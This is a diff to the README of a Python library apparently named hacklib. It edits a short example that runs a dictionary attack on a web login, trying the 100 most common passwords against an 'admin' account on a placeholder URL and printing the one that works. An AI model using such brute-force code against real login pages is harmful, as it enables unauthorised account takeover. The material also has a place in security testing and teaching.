@@ -46,7 +46,7 @@ if htmldata != False:
 
 # For form-based logins, returns HTML whether login works or not.
 # Returns False if resulting page has the same URL as the login page
-if htmldata and 'incorrect' not in htmldata:
+if htmldata and 'try again' not in htmldata:
     print 'Login Success'
 ```
 Simple Dictionary Attack using AuthClient:
@@ -54,9 +54,10 @@ Simple Dictionary Attack using AuthClient:
 import hacklib
 
 ac = hacklib.AuthClient()
-100passwords = topPasswords(100)
+# Get the top 100 most common passwords
+passwords = topPasswords(100)
 
-for p in 100passwords:
+for p in passwords:
     htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
     if 'try again' not in htmldata:
         print 'Password is', p
